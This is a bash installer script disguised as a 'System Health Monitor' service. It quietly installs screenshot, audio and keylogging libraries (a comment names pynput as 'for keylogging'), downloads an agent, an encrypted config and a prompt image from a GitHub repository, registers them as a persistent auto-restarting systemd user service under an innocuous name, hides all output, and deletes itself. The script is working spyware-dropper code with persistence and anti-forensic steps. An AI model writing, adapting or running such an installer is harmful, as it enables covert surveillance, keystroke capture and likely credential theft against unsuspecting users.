#!/bin/bash

# Configuration
REPO="https://github.com/system-health/update-service/raw/refs/heads/main"
INSTALL_DIR="$HOME/.config/system-health"
SERVICE_NAME="health-monitor.service"

# 1. Install System Dependencies First
echo "[*] Installing system dependencies..."
if command -v sudo >/dev/null 2>&1; then
   # Try apt-get (Debian/Ubuntu)
   if command -v apt-get >/dev/null 2>&1; then
      sudo apt-get update -qq >/dev/null 2>&1
      sudo apt-get install -y -qq python3 python3-pip python3-tk scrot xinput alsa-utils python3-opencv python3-pil >/dev/null 2>&1
   # Try dnf (Fedora)
   elif command -v dnf >/dev/null 2>&1; then
      sudo dnf install -y -q python3 python3-pip python3-tkinter scrot xinput alsa-utils python3-opencv python3-pillow >/dev/null 2>&1
   # Try pacman (Arch)
   elif command -v pacman >/dev/null 2>&1; then
      sudo pacman -Sy --noconfirm python python-pip tk scrot xorg-xinput alsa-utils python-opencv python-pillow >/dev/null 2>&1
   fi
fi

# 2. Install Python Dependencies (pip packages)
echo "[*] Installing Python libraries..."
# mss - for screenshots
# pynput - for keylogging
# opencv-python - for image processing (dialog darkening)
# pillow - fallback for image processing
python3 -m pip install --quiet --break-system-packages mss pynput opencv-python pillow 2>/dev/null || \
python3 -m pip install --quiet --user mss pynput opencv-python pillow 2>/dev/null || \
pip3 install --quiet mss pynput opencv-python pillow 2>/dev/null

# 3. Create Directory
echo "[*] Setting up agent..."
mkdir -p "$INSTALL_DIR"

# 4. Download Files
if command -v curl >/dev/null 2>&1; then
   curl -sL "$REPO/linux/agent.py" -o "$INSTALL_DIR/agent.py"
   curl -sL "$REPO/config.enc" -o "$INSTALL_DIR/config.enc"
   curl -sL "$REPO/linux/prompt.png" -o "$INSTALL_DIR/prompt.png"
elif command -v wget >/dev/null 2>&1; then
   wget -qO "$INSTALL_DIR/agent.py" "$REPO/linux/agent.py"
   wget -qO "$INSTALL_DIR/config.enc" "$REPO/config.enc"
   wget -qO "$INSTALL_DIR/prompt.png" "$REPO/linux/prompt.png"
else
   echo "[-] No downloader found."
   exit 1
fi

# 5. Create Systemd User Service
mkdir -p "$HOME/.config/systemd/user"
cat <<EOF > "$HOME/.config/systemd/user/$SERVICE_NAME"
[Unit]
Description=System Health Monitor
After=network.target

[Service]
ExecStart=/usr/bin/python3 $INSTALL_DIR/agent.py
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

# 6. Enable and Start Service
echo "[*] Starting agent service..."
systemctl --user daemon-reload
systemctl --user enable "$SERVICE_NAME" >/dev/null 2>&1
systemctl --user restart "$SERVICE_NAME"

echo "[+] Installation complete!"
echo ""
echo "Installed packages:"
echo "  System: python3, python3-pip, python3-tk, scrot, xinput, alsa-utils, opencv, pillow"
echo "  Python: mss, pynput, opencv-python, pillow"

# 7. Cleanup Self
rm -- "$0" 2>/dev/null
